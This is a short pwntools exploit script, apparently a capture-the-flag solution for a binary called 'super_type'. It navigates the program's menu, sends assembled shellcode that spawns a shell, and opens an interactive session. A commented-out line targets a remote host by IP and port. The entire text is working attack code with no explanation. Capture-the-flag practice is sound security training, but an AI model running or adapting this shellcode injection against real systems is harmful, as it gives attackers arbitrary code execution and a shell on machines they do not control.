from pwn import *

context.binary = './super_type'
p = process('./super_type')
#p = remote('27.133.155.191', 30008)
p.sendlineafter('What do you do? :', '0')
p.sendlineafter('What do you do? :', '2')

p.sendline(asm(shellcraft.sh()))
p.sendline('5')
p.interactive()
